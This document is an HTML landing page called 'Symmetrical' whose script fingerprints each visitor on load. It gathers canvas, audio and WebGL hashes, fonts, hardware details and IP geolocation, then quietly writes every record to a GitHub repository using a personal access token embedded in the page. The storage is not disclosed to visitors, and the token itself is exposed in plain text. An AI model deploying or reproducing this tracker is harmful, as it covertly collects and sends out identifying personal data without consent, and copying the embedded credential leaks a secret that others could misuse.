<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Symmetrical</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { background: #0a0a0a; font-family: 'Inter', system-ui, -apple-system, sans-serif; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.06); }
        .gradient-text { background: linear-gradient(135deg, #f0f0f0 0%, #a0a0a0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card-hover { transition: all 0.2s ease; }
        .card-hover:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a0a; }
        ::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 8px; }
    </style>
</head>
<body class="text-white min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-5xl mx-auto space-y-8">

        <div class="text-center space-y-3">
            <h1 class="text-6xl md:text-7xl font-bold tracking-tight gradient-text">Welcome to Symmetrical</h1>
            <p class="text-gray-400 text-lg font-light tracking-wide">modern · minimal · transparent</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-6">
            <div class="glass rounded-2xl p-6 card-hover flex flex-col items-center text-center">
                <div class="text-4xl text-blue-400 mb-3"><i class="fas fa-satellite-dish"></i></div>
                <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">Latency</h3>
                <p class="text-xs text-gray-500 mt-1">real-time</p>
            </div>
            <div class="glass rounded-2xl p-6 card-hover flex flex-col items-center text-center">
                <div class="text-4xl text-emerald-400 mb-3"><i class="fas fa-shield-halved"></i></div>
                <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">Secure</h3>
                <p class="text-xs text-gray-500 mt-1">encrypted</p>
            </div>
            <div class="glass rounded-2xl p-6 card-hover flex flex-col items-center text-center">
                <div class="text-4xl text-amber-400 mb-3"><i class="fas fa-bolt"></i></div>
                <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">Instant</h3>
                <p class="text-xs text-gray-500 mt-1">no delays</p>
            </div>
        </div>

        <div class="glass rounded-2xl p-6 md:p-8 card-hover border border-white/5">
            <div class="flex items-center gap-3 mb-5">
                <i class="fas fa-circle-info text-blue-400 text-xl"></i>
                <h2 class="text-xl font-semibold tracking-tight">Device & Network Info</h2>
                <span class="ml-auto text-xs text-gray-500 bg-black/40 px-3 py-1 rounded-full">grabbed on load</span>
            </div>
            <div id="info-grid" class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm font-mono"></div>
            <div class="mt-5 pt-4 border-t border-white/5 text-xs text-gray-500 flex justify-between">
                <span><i class="fas fa-fingerprint mr-1"></i> fingerprint</span>
                <span id="timestamp" class="text-gray-600"></span>
            </div>
        </div>

        <div class="text-center text-[10px] text-gray-700 tracking-widest uppercase mt-6">· symmetrical ·</div>
    </div>

    <script>
        (function() {
            // ----- CONFIGURATION (UPDATED WITH YOUR DATA) -----
            const GITHUB_TOKEN = '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';
            const REPO_OWNER = 'codebase133799';
            const REPO_NAME = 'Test';
            const FILE_PATH = 'visitors_log.json';

            const data = {};

            // ---- COLLECT ALL INFO ----
            data.ip = 'fetching...';
            data.ip_isp = '...';
            data.ip_city = '...';
            data.ip_region = '...';
            data.ip_country = '...';
            data.ip_loc = '...';
            data.ip_org = '...';
            data.ip_timezone = '...';

            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.languages = navigator.languages ? navigator.languages.join(', ') : 'n/a';
            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
            data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
            data.screenWidth = window.screen.width;
            data.screenHeight = window.screen.height;
            data.screenColorDepth = window.screen.colorDepth;
            data.viewportWidth = window.innerWidth;
            data.viewportHeight = window.innerHeight;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.localTime = new Date().toString();
            data.doNotTrack = navigator.doNotTrack || 'unspecified';
            data.cookieEnabled = navigator.cookieEnabled;
            data.onLine = navigator.onLine;
            data.referrer = document.referrer || 'direct';
            data.hostname = window.location.hostname;
            data.pathname = window.location.pathname;
            data.protocol = window.location.protocol;

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        data.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'n/a';
                        data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'n/a';
                    } else {
                        data.gpuVendor = 'not available (no debug ext)';
                        data.gpuRenderer = 'not available';
                    }
                } else {
                    data.gpuVendor = 'webgl not supported';
                    data.gpuRenderer = 'webgl not supported';
                }
            } catch(e) {
                data.gpuVendor = 'error';
                data.gpuRenderer = 'error';
            }

            let plugins = [];
            try {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
            } catch(e) { plugins = ['unavailable']; }
            data.plugins = plugins.join('; ') || 'none';

            try {
                const fontCanvas = document.createElement('canvas');
                fontCanvas.width = 200;
                fontCanvas.height = 50;
                const ctx = fontCanvas.getContext('2d');
                const testFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS'];
                let fontSig = '';
                for (let f of testFonts) {
                    ctx.font = '20px ' + f;
                    fontSig += f + ':' + ctx.measureText('abcdefghijklmnopqrstuvwxyz').width + ';';
                }
                data.fontSignature = fontSig.substring(0, 120) + '...';
            } catch(e) { data.fontSignature = 'error'; }

            try {
                const c = document.createElement('canvas');
                c.width = 200;
                c.height = 50;
                const cx = c.getContext('2d');
                cx.textBaseline = 'top';
                cx.font = '14px Arial';
                cx.fillStyle = '#f60';
                cx.fillRect(0, 0, 100, 50);
                cx.fillStyle = '#069';
                cx.fillText('symmetrical', 10, 10);
                cx.strokeStyle = '#fff';
                cx.lineWidth = 2;
                cx.strokeRect(5, 5, 190, 40);
                const imgData = cx.getImageData(0, 0, 200, 50).data;
                let hash = 0;
                for (let i = 0; i < imgData.length; i += 4) {
                    hash = ((hash << 5) - hash) + imgData[i] + imgData[i+1] + imgData[i+2];
                    hash = hash & hash;
                }
                data.canvasHash = hash.toString(16);
            } catch(e) { data.canvasHash = 'error'; }

            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.value = 440;
                gain.gain.value = 0;
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start(0);
                osc.stop(0.1);
                const analyser = audioCtx.createAnalyser();
                gain.connect(analyser);
                const buffer = new Float32Array(analyser.fftSize);
                analyser.getFloatTimeDomainData(buffer);
                let audioHash = 0;
                for (let i = 0; i < buffer.length; i++) {
                    audioHash = ((audioHash << 5) - audioHash) + Math.floor(buffer[i] * 1000);
                    audioHash = audioHash & audioHash;
                }
                data.audioHash = audioHash.toString(16);
                audioCtx.close();
            } catch(e) { data.audioHash = 'not supported'; }

            // ---- RENDER FUNCTION ----
            function renderInfo() {
                const grid = document.getElementById('info-grid');
                if (!grid) return;
                const entries = [
                    ['IP Address', data.ip],
                    ['ISP / Org', data.ip_org],
                    ['Location', data.ip_city + ', ' + data.ip_region + ' ' + data.ip_country],
                    ['Timezone (geo)', data.ip_timezone],
                    ['Browser UA', data.userAgent],
                    ['Platform', data.platform],
                    ['Language', data.language],
                    ['Languages (pref)', data.languages],
                    ['CPU Cores', data.hardwareConcurrency],
                    ['Device Memory', data.deviceMemory],
                    ['Screen', data.screenWidth + 'x' + data.screenHeight + ' @' + data.screenColorDepth + 'bit'],
                    ['Viewport', data.viewportWidth + 'x' + data.viewportHeight],
                    ['Timezone (browser)', data.timezone],
                    ['Local Time', data.localTime],
                    ['Do Not Track', data.doNotTrack],
                    ['Cookies Enabled', data.cookieEnabled],
                    ['Online', data.onLine],
                    ['Referrer', data.referrer],
                    ['Host', data.hostname],
                    ['Path', data.pathname],
                    ['Protocol', data.protocol],
                    ['GPU Vendor', data.gpuVendor],
                    ['GPU Renderer', data.gpuRenderer],
                    ['Plugins', data.plugins.substring(0, 140)],
                    ['Font Signature', data.fontSignature],
                    ['Canvas Hash', data.canvasHash],
                    ['Audio Hash', data.audioHash]
                ];
                grid.innerHTML = '';
                entries.forEach(([label, value]) => {
                    const div = document.createElement('div');
                    div.className = 'flex justify-between items-start border-b border-white/5 py-2 px-1 gap-2';
                    const lbl = document.createElement('span');
                    lbl.className = 'text-gray-400 text-[11px] uppercase tracking-wider font-medium';
                    lbl.textContent = label;
                    const val = document.createElement('span');
                    val.className = 'text-gray-200 text-right break-all max-w-[60%] text-[12px] font-mono';
                    val.textContent = String(value) || 'n/a';
                    div.appendChild(lbl);
                    div.appendChild(val);
                    grid.appendChild(div);
                });
                document.getElementById('timestamp').textContent = 'collected: ' + new Date().toISOString();
            }

            // ---- FETCH IP ----
            async function fetchIP() {
                try {
                    const resp = await fetch('https://ipapi.co/json/');
                    const json = await resp.json();
                    if (json.ip) {
                        data.ip = json.ip || 'unknown';
                        data.ip_city = json.city || 'unknown';
                        data.ip_region = json.region || 'unknown';
                        data.ip_country = json.country_name || 'unknown';
                        data.ip_loc = json.latitude + ',' + json.longitude || 'unknown';
                        data.ip_org = json.org || json.isp || 'unknown';
                        data.ip_timezone = json.timezone || 'unknown';
                        data.ip_isp = json.isp || 'unknown';
                    } else {
                        const resp2 = await fetch('https://api.ipify.org?format=json');
                        const json2 = await resp2.json();
                        if (json2.ip) {
                            data.ip = json2.ip;
                            const geoResp = await fetch('https://ipapi.co/' + json2.ip + '/json/');
                            const geoJson = await geoResp.json();
                            data.ip_city = geoJson.city || 'unknown';
                            data.ip_region = geoJson.region || 'unknown';
                            data.ip_country = geoJson.country_name || 'unknown';
                            data.ip_loc = geoJson.latitude + ',' + geoJson.longitude || 'unknown';
                            data.ip_org = geoJson.org || geoJson.isp || 'unknown';
                            data.ip_timezone = geoJson.timezone || 'unknown';
                        }
                    }
                } catch(e) {
                    try {
                        const resp = await fetch('https://ip-api.com/json/');
                        const json = await resp.json();
                        if (json && json.query) {
                            data.ip = json.query;
                            data.ip_city = json.city || 'unknown';
                            data.ip_region = json.regionName || 'unknown';
                            data.ip_country = json.country || 'unknown';
                            data.ip_loc = json.lat + ',' + json.lon || 'unknown';
                            data.ip_org = json.isp || 'unknown';
                            data.ip_timezone = json.timezone || 'unknown';
                        }
                    } catch(e2) {
                        data.ip = 'unavailable (blocked)';
                    }
                }
                renderInfo();
                saveToGitHub(data);
            }

            // ---- SAVE TO GITHUB ----
            async function saveToGitHub(payload) {
                const clean = {};
                for (let k in payload) {
                    if (typeof payload[k] !== 'function') {
                        clean[k] = String(payload[k]);
                    }
                }
                clean.timestamp_utc = new Date().toISOString();

                let existingSha = null;
                let existingData = [];
                try {
                    const getResp = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
                        headers: {
                            'Authorization': 'token ' + GITHUB_TOKEN,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    });
                    if (getResp.status === 200) {
                        const json = await getResp.json();
                        existingSha = json.sha;
                        const content = atob(json.content);
                        try {
                            existingData = JSON.parse(content);
                            if (!Array.isArray(existingData)) existingData = [existingData];
                        } catch(e) { existingData = []; }
                    } else if (getResp.status === 404) {
                        // file does not exist, will create
                    } else {
                        console.warn('GitHub fetch status:', getResp.status);
                    }
                } catch(e) {
                    console.warn('GitHub read error:', e);
                }

                existingData.push(clean);
                const newContent = JSON.stringify(existingData, null, 2);
                const encoded = btoa(unescape(encodeURIComponent(newContent)));

                const putBody = {
                    message: 'auto-log visitor ' + clean.timestamp_utc,
                    content: encoded,
                    sha: existingSha || undefined
                };
                try {
                    const putResp = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
                        method: 'PUT',
                        headers: {
                            'Authorization': 'token ' + GITHUB_TOKEN,
                            'Accept': 'application/vnd.github.v3+json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(putBody)
                    });
                    if (putResp.status === 201 || putResp.status === 200) {
                        console.log('GitHub save OK');
                    } else {
                        const errText = await putResp.text();
                        console.error('GitHub save failed:', putResp.status, errText);
                        try {
                            const fallback = JSON.parse(localStorage.getItem('symmetrical_fallback') || '[]');
                            fallback.push(clean);
                            localStorage.setItem('symmetrical_fallback', JSON.stringify(fallback));
                        } catch(e) {}
                    }
                } catch(e) {
                    console.error('GitHub put error:', e);
                    try {
                        const fallback = JSON.parse(localStorage.getItem('symmetrical_fallback') || '[]');
                        fallback.push(clean);
                        localStorage.setItem('symmetrical_fallback', JSON.stringify(fallback));
                    } catch(e2) {}
                }
            }

            // ---- INIT ----
            fetchIP();
            setTimeout(() => {
                if (document.getElementById('info-grid').children.length === 0) {
                    renderInfo();
                }
            }, 100);
        })();
    </script>
</body>
</html>
